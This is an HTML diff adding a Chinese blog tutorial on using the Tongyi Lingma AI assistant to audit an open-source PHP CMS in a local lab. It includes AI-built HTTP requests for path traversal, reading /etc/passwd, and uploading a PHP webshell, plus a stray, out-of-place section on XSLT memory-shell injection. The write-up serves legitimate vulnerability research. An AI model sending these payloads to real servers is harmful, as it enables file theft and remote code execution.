@@ -86,6 +86,360 @@
 
     
         <h2 class="title">
+            <a href="/2025/11/24/AI-Code-Review-1/">
+                【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践
+            </a>
+        </h2>
+    
+    <time>
+        Nov 24, 2025
+    </time>
+    <section class="content">
+        <h1><span id="灵码助力安全1利用通义灵码辅助快速代码审计的最佳实践">【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1629257">周周的奇妙编程</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>已经有接近两个月没有更新文章了，给大家说声抱歉。这段时间因为个人原因一直在备赛，所以9月去参加云栖大会的观后感，以及之前兴致勃勃想测评大模型平台的文章也迟迟没有写出来。<strong>争取在未来的两个月内把这些内容都补上</strong>。</p>
+<p>准备的比赛是数据安全相关的，由于队伍中有几位经验丰富的大佬带领，我们自然也是顺利入围了全国决赛。至于为什么要写这篇文章呢？说来也很巧，在半决赛时，有一个靶机直接把我们零封了，全场没有一个人能getshell。该靶机采用的是一个开源框架，而且网上并没有任何公开可用的漏洞信息，且由于比赛是在局域网环境下进行的，也没办法直接把代码拉下来审计。</p>
+<p>赛后，我对这件事一直耿耿于怀，于是这两周就把这个框架好好地审计了一遍，确实找到了一些有趣且潜在的漏洞点。而在这一过程中，<strong>“通义灵码”起到了较大的帮助</strong>，帮助我节省了不少时间。这里，我想借这篇文章分享一下我的发现以及整个过程中的一些心得体会，姑且也算是个最佳实践了。</p>
+</blockquote>
+<h2><span id="审计对象">审计对象</span></h2><blockquote>
+<p>本次审计的对象主要有两个：<strong>某开源PHP最新版6.0</strong> 和 <strong>某开源OA最新版2.6.5</strong></p>
+<p>借助通义灵码，共审计出开源PHP最新版6.0高危漏洞<strong>4</strong>个，某开源OA最新版2.6.5高危漏洞<strong>1</strong>个 , 目前已提交至CNVD平台，尚在审核流程中，所以此处不便直接透露详细信息。</p>
+</blockquote>
+<h2><span id="工具准备">工具准备</span></h2><h3><span id="环境搭建工具">环境搭建工具</span></h3><blockquote>
+<p>**phpstudy_pro(小皮面板)**：在国内比较流行的一键安装环境包，它集成了 PHP、MySQL、Apache&#x2F;Nginx 等服务，方便开发者快速搭建 Web 开发和测试环境，用于上述两个靶场的搭建。</p>
+</blockquote>
+<h3><span id="代码审计工具">代码审计工具</span></h3><blockquote>
+<p><strong>Seay源代码审计</strong>：基于C#语言开发的一款针对PHP代码安全性审计的系统，主要运行于Windows系统上。这款软件能够发现SQL注入、代码执行、命令执行、文件包含、文件上传、绕过转义防护、拒绝服务、XSS跨站、信息泄露、任意URL跳转等漏洞，基本上覆盖常见PHP漏洞。另外，在功能上，它支持一键审计、代码调试、函数定位、插件扩展、自定义规则配置、代码高亮、编码调试转换、数据库执行监控等数十项强大功能，由于已经停止维护了，官网上也下载不到，百度云盘地址如下：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1HHnniTNWzXhb-pn6OZgexA">https://pan.baidu.com/s/1HHnniTNWzXhb-pn6OZgexA</a> 密码：75ji</p>
+<p><strong>CodeScan</strong>：基于GO语言的快速匹配Sink点的工具，使用起来还行，地址如下：<a target="_blank" rel="noopener" href="https://github.com/Zjackky/CodeScan">https://github.com/Zjackky/CodeScan</a></p>
+<p><strong>RIPS ：</strong>Rips是一个用PHP编写的源代码分析工具，它采用了静态分析技术，能够自动化地检测PHP代码中的安全漏洞，如XSS（跨站脚本攻击）、SQL注入、文件泄露、Header Injection等。Rips不仅提供了直观的扫描结果展示，还集成了代码审计框架，方便渗透测试人员直接审阅分析结果，大大提高了代码审计的效率。地址如下：<a target="_blank" rel="noopener" href="https://rips-scanner.sourceforge.net/">https://rips-scanner.sourceforge.net/</a></p>
+</blockquote>
+<h3><span id="代码编写及辅助工具">代码编写及辅助工具</span></h3><blockquote>
+<p><strong>Visual Studio Code</strong> ：(简称 VS Code) 是由微软开发的一款免费且开源的源代码编辑器，支持 Windows、macOS 和 Linux 平台。</p>
+<p><strong>通义灵码</strong>：本次的主角，基于通义大模型的 AI 研发辅助工具，包含 AI 编码助手和 AI 程序员。其中，AI 编码助手为开发者写代码、补代码、写注释、写单测、写代码优化和排查问题，是开发者的编码搭子； AI 程序员是一个 AI 编程智能体，可以模拟软件架构师、开发工程师、测试工程师等多种岗位能力，分钟级自主完成任务拆解、代码编写、缺陷修复、测试等编程相关任务，为企业软件研发降本增效。</p>
+<p>遗憾的是，我这里没有申请到AI 程序员的试用资格，所以只能暂时以灵码为例了。</p>
+</blockquote>
+<h3><span id="2-去利用xslt去注入内存马">2、去利用XSLT去注入内存马</span></h3><blockquote>
+<p>这个应该是最好使的方案，Nookipop已经讲过了，在不出网时可以利用XSLT去打入内存马，进行命令执行，打入suo5内存马进行正向代理内网穿透。<br>详见 <a target="_blank" rel="noopener" href="https://forum.butian.net/share/2592">记一次曲折的XXL-JOB API Hessian反序列化到Getshell</a></p>
+</blockquote>
+<h2><span id="源码下载">源码下载</span></h2><blockquote>
+<p>由于是开源代码，在Github、gitee以及站长网站上都是可以免费下载到的，有些开源网站如果有定制服务的话也可能会有自己的主站。</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/1.png" alt="image"></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>将下载后的源码放在phpstudy的 www 目录下</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/3.png" alt="image"></p>
+<p>进入 phpstudy_pro\WWW\cltopen-master\cltopen-master\config 目录下，修改数据库配置文件</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/4.png" alt="image"></p>
+<p>修改之后可以进入数据库中，导入该开源项目的示例数据库</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/5.png" alt="image"></p>
+<p>打开phpstudy ，设置域名和根目录</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/6.png" alt="image"></p>
+<p>设置伪静态（必须）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!-e $request_filename)&#123;</span><br><span class="line">   </span><br><span class="line">        rewrite  ^(.*)$  /index.<span class="property">php</span>?s=$<span class="number">1</span>  last;   <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/7.png" alt="image"></p>
+<p>点击确认即可，打开浏览器访问域名即可看到</p>
+<p>同理，对于某OA系统的搭建也是如此，只不过该OA里自带了一个初始化数据库的引导界面，所以不需要手动修改数据库配置文件</p>
+</blockquote>
+<h2><span id="审计打点">审计打点</span></h2><blockquote>
+<p>在环境搭建好之后就可以开始准备代码审计了，正常来说代码审计的第一步应该是熟悉框架、通读代码，具体的方式与个人代码能力和编程语言的熟悉程度有关系，有时，为了快速审计，就会采用上述几个工具进行打点和标注，由于工具内置的正则不同，所以结果也会略有差异，如果想尽可能的找到所有漏洞点的话，应该以上述工具的结果之和为参考。</p>
+<p>值得一说的是，有时候工具可能也会存在漏报和误报的情况，所以此处结果仅能做参考，还需要人工进行审核和验证。</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/8.png" alt="image"></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/9.png" alt="image"></p>
+<p>这套开源代码的漏洞确实比较多，后台随手一测就是一个SQL注入，所以我们这里只挑危害比较高的漏洞去挖掘，主要关注文件读取、文件包含、文件上传等方法。</p>
+<p>在排除该代码5.5版本及之前存在且已修复的漏洞后，最终锁定到后台管理控制层下面的Template.php文件处（本次仅针对此处进行了挖掘和分析）</p>
+</blockquote>
+<h2><span id="源码分析">源码分析</span></h2><blockquote>
+<p>打开源码，进入到Template.php页面下，可以看到代码如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/10.png" alt="image"></p>
+<p>主要是定义了一个 Template 控制类，用于管理模板文件的增删改查操作，以及图片文件的管理和删除。</p>
+<p>按照往常，我们应该会结合上述审查工具提示的代码位置去进行分析和判断，但是，现在我们有了<strong>通义灵码</strong>，一切都变得不一样了。</p>
+<p>首先我们全选代码，使用提示词如下：</p>
+<blockquote>
+<p>已知该代码中存在安全漏洞，请你找出你能确定的漏洞，并简要分析该漏洞形成原因</p>
+</blockquote>
+<p>这段 prompt 有几点比较关键：</p>
+<ol>
+<li>我们需要明确告知灵码，这里<strong>确实存在</strong>安全漏洞，同时也是确认主题，避免输出其他内容</li>
+<li>我们需要告知，找出它能<strong>确定的</strong>漏洞，减少误报和泛化判断</li>
+<li>明确最终结果是<strong>分析该漏洞形成原因</strong>，也便于安全工程师理解</li>
+</ol>
+<p>随即，灵码会针对该段代码进行一次静态审查，并给出结果如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞及分析</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.路径遍历漏洞</span><br><span class="line"></span><br><span class="line">位置：insert, edit, update, delete, imgDel , Images方法</span><br><span class="line">原因：用户输入的文件路径和文件名未进行严格验证，可能导致路径遍历攻击。例如，通过在文件名中包含 ../，攻击者可以访问或操作任意文件。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.file&#x27;</span>); <span class="comment">// 用户输入未验证</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$type</span>==<span class="variable language_">$this</span>-&gt;viewSuffix ?  <span class="variable language_">$this</span>-&gt;filepath : <span class="variable language_">$this</span>-&gt;publicpath.<span class="variable">$type</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$type</span>; <span class="comment">// 可能导致路径遍历</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.文件上传漏洞</span><br><span class="line"></span><br><span class="line">位置：insert, update 方法</span><br><span class="line">原因：用户上传的内容未进行严格验证，可能导致恶意代码注入。例如，攻击者可以通过上传恶意脚本文件来执行任意代码。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">stripslashes</span>(<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.content&#x27;</span>))); <span class="comment">// 未验证内容</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.目录删除漏洞</span><br><span class="line"></span><br><span class="line">位置：imgDel 方法</span><br><span class="line">原因：用户输入的目录路径未进行严格验证，可能导致任意目录被删除。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;publicpath.<span class="string">&#x27;images/&#x27;</span>.<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.folder&#x27;</span>); <span class="comment">// 用户输入未验证</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$path</span>.<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.filename&#x27;</span>); <span class="comment">// 可能导致路径遍历</span></span><br><span class="line"><span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">dir_delete</span>(<span class="variable">$file</span>) : <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); <span class="comment">// 删除目录或文件</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.SQL 注入漏洞</span><br><span class="line"></span><br><span class="line">位置：无明显 SQL 注入风险，但需要注意后续可能引入的数据库操作。</span><br><span class="line">原因：虽然当前代码没有直接的 SQL 操作，但如果后续版本中引入了数据库操作，且用户输入未进行适当处理，可能会导致 SQL 注入。</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.XSS 漏洞</span><br><span class="line"></span><br><span class="line">位置：edit, images 方法</span><br><span class="line">原因：用户输入的内容未进行转义处理，可能导致跨站脚本攻击（XSS）。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); <span class="comment">// 未转义</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span> ( <span class="string">&#x27;content&#x27;</span>,<span class="variable">$content</span> ); <span class="comment">// 直接输出到页面</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/11.png" alt="image"></p>
+<p>每一个漏洞下面都标明了存在该漏洞的方法和引发原因，并且对于不存在的漏洞也明确说明了（没有产生幻觉）</p>
+<p>下面，我们需要做的就是进入到web界面中，找到调用此处方法的位置</p>
+</blockquote>
+<h3><span id="路径遍历漏洞-任意文件删除漏洞">路径遍历漏洞、任意文件删除漏洞</span></h3><blockquote>
+<p><img src="/2025/11/24/AI-Code-Review-1/12.png" alt="image"></p>
+<p>采用BP抓包，此处以edit方法为例，可以发现拼接方式是 <strong>admin&#x2F;模块&#x2F;方法&#x2F;操作对象类型&#x2F;操作对象</strong></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/13.png" alt="image"></p>
+<p>观察到下面的update方法是在保存之后可以直接执行的，所以此处尝试直接替换成edit方法</p>
+<p>其中请求包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/edit.html</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>假设是一个完全看不懂代码的小白，你也可以选择把这段请求包丢进去：</p>
+<blockquote>
+<p>已知请求包如下，请你帮忙修改请求包以验证该漏洞存在：</p>
+</blockquote>
+<p><img src="/2025/11/24/AI-Code-Review-1/14.png" alt="image"></p>
+<p>此时，它会根据当前的传入参数自动构造一个修改后的返回包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/edit.html?file=../../../../etc/passwd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>默认是以Linux服务器的路径为例的，也可以告知说明是windows系统，让他再次修改。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/edit.html?file=..\..\..\..\Windows\System32\drivers\etc\hosts</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>除此，下面也配上了漏洞分析和预期结果：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">漏洞分析</span><br><span class="line">文件名参数：file=..\..\..\..\Windows\System32\drivers\etc\hosts</span><br><span class="line">这个参数尝试通过路径遍历访问 Windows 系统根目录下的 C:\Windows\System32\drivers\etc\hosts 文件。如果服务器存在路径遍历漏洞，这个请求将会返回 hosts 文件的内容。</span><br><span class="line">其他参数：保留原始请求中的其他参数，以确保请求的完整性和有效性。</span><br><span class="line"></span><br><span class="line">预期结果</span><br><span class="line">如果服务器存在路径遍历漏洞，响应中将包含 hosts 文件的内容。</span><br><span class="line">如果服务器没有漏洞，响应中可能会显示错误信息，表示文件不存在或无法访问。</span><br></pre></td></tr></table></figure>
+
+<p>再回到BP中，我们根据当前路径尝试验证，成功复现漏洞，可以任意读取文件内容：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/15.png" alt="image"></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/16.png" alt="image"></p>
+<p>再比如，定位到Images方法处</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/17.png" alt="image"></p>
+<p>采用BP抓包，可直接抓到如下地址：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/18.png" alt="image"></p>
+<p>借助灵码直接构造请求包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/images.html?folder=../../</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>可在图片查看界面实现对文件目录的遍历：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/19.png" alt="image"></p>
+<p>同理，这里也可以结合imgDel方法实现对服务器任意文件的删除，具有极高危害！</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/20.png" alt="image"></p>
+</blockquote>
+<h3><span id="文件上传漏洞-文件内容覆盖漏洞">文件上传漏洞、文件内容覆盖漏洞</span></h3><blockquote>
+<p>继续跟进上述灵码输出内容，我们知道此处insert, update 方法还存在文件上传漏洞</p>
+<p>在BP中抓包地址如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/21.png" alt="image"></p>
+<p>我们先修改为insert方法，故当前请求包为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/insert.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>48</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/edit/file/article_list.html.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>将请求包丢入灵码中，让其构造能够验证漏洞存在的请求包：</p>
+<blockquote>
+<p>已知insert方法中存在文件上传漏洞，下面这是该方法的请求包，请你修改请求包以让我验证漏洞是否存在，依据代码本身来，不要额外新增参数</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/insert.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>65</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://public</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/edit/file/article_list.html.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">file=test.php&amp;type=php&amp;content=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，灵码根据当前insert方法需要输入的参数，自己构造了一个请求包</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/22.png" alt="image"></p>
+<p>并且下面也给出了相应解释及详细验证步骤</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/23.png" alt="image"></p>
+<p>因为是本机测试环境，所以我就换了一个无影响的文件内容来进行验证</p>
